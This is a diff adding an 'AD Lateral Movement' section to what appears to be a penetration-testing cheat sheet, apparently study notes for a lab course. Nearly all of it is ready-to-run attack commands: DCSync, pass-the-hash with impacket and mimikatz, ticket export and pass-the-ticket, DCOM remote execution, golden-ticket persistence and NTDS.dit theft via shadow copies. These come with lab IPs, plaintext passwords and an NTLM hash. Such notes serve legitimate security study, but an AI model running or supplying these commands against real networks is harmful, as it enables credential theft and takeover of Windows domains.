@@ -482,3 +482,42 @@ Atak:
             lsadump::dcsync /user:corp\dave
         Lin:
             impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+
+AD Lateral Movement:
+    WMI and WinRS:
+
+    psexec:
+        Lin:   
+            psexec.py jen@192.168.248.72
+            psexec.py jen@192.168.248.72 -hashes LMHASH:NTHASH
+        Win:
+            ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+    PassTheHash:
+        impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+    Overpass The Hash:
+        sekurlsa::pth /user:administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell 
+        net use \\files04 (or any other command that creates TGS)
+        cd C:\tools\SysinternalsSuite\
+        .\PsExec.exe \\files04 cmd
+        klist (shows cached kerberos tickets)
+    Pass The Ticket:
+        sekurlsa::tickets /export
+        dir *.kirbi
+        kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+    DCOM:
+        in admin powershell:
+            $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
+            $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+    Persistence:
+        Golden (lsadump::lsa /patch from Domain Controller priviledged account):
+            kerberos::purge
+            kerberos::golden /user:jen /domain:corp.com /sid:<domain_sid> /krbtgt:<krbtgt_ntlm> /ptt
+            misc::cmd
+            PsExec.exe \\dc1 cmd.exe
+    Shadow Copiez:
+        again from domain controller elevated user
+            vshadow.exe -nw -p  C:
+            copy <shadow copy device name> c:\ntds.dit.bak
+            reg.exe save hklm\system c:\system.bak
+        Then download files and run this on our kali:
+            impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
